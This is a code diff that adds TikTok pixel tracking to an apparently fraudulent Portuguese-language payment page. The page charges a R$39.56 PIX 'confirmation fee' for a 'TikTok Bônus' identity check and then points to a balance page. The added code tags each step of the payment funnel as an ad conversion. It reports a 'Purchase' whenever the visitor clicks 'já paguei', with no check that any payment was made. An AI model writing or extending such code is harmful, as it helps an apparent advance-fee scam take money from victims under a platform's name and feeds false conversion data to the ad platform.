@@ -9,6 +9,8 @@
   <link rel="icon" href="assets/icon.svg" type="image/svg+xml">
   <link rel="stylesheet" href="assets/_next/static/chunks/8a80e7184ad3a13f.css">
   <link rel="stylesheet" href="assets/_next/static/chunks/d53fa3d4da85ccbf.css">
+  <script src="assets/tiktok-pixel-config.js"></script>
+  <script src="assets/tiktok-pixel.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 </head>
 <body class="font-sans antialiased bg-[#F3F4F6]">
@@ -230,6 +232,9 @@
         if (codigoPixInline) codigoPixInline.textContent = pixCode || 'Use o QR Code acima para pagar.';
         if (areaAntesPix) areaAntesPix.style.display = 'none';
         if (areaPixInline) areaPixInline.style.display = 'block';
+        if (typeof ttq !== 'undefined') {
+          ttq.track('InitiateCheckout', { value: 39.56, currency: 'BRL', event_id: 'checkout_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9) });
+        }
         if (isQrcodeAUrl && qrInlineImg) {
           qrInlineImg.src = pixQrcode;
           qrInlineImg.style.display = 'block';
@@ -263,6 +268,9 @@
       if (btnTaxa) {
         btnTaxa.addEventListener('click', function() {
           if (btnTaxa.dataset.loading === '1') return;
+          if (typeof ttq !== 'undefined') {
+            ttq.track('AddToCart', { content_id: 'taxa-confirmacao', value: 39.56, currency: 'BRL', event_id: 'add_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9) });
+          }
           btnTaxa.dataset.loading = '1';
           btnTaxa.style.opacity = '0.7';
           btnTaxa.style.pointerEvents = 'none';
@@ -316,6 +324,17 @@
         });
       }
 
+      var btnJaPagueiInline = document.getElementById('btn-ja-paguei-inline');
+      if (btnJaPagueiInline && typeof ttq !== 'undefined') {
+        btnJaPagueiInline.addEventListener('click', function(e) {
+          e.preventDefault();
+          var purchaseEventId = 'purchase_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9);
+          var purchaseParams = { value: 39.56, currency: 'BRL', content_id: 'taxa-confirmacao', content_type: 'product', content_name: 'Taxa de confirmação TikTok Bônus', event_id: purchaseEventId };
+          try { var ttclid = localStorage.getItem('ttclid'); if (ttclid) purchaseParams.ttclid = ttclid; } catch (_) {}
+          ttq.track('Purchase', purchaseParams);
+          window.location.href = btnJaPagueiInline.getAttribute('href') || 'saldo.html';
+        });
+      }
       if (btnCopiarInline && codigoPixInline) {
         btnCopiarInline.addEventListener('click', function() {
           var text = codigoPixInline.textContent || '';
@@ -325,6 +344,9 @@
             setTimeout(function() { btnCopiarInline.textContent = 'Copiar'; }, 1500);
           } catch (_) {}
         });
+      }
+      if (typeof ttq !== 'undefined') {
+        ttq.track('ViewContent', { content_id: 'confirmacao-identidade', content_name: 'Confirmação de identidade', content_type: 'product', value: 39.56, currency: 'BRL' });
       }
     })();
   </script>
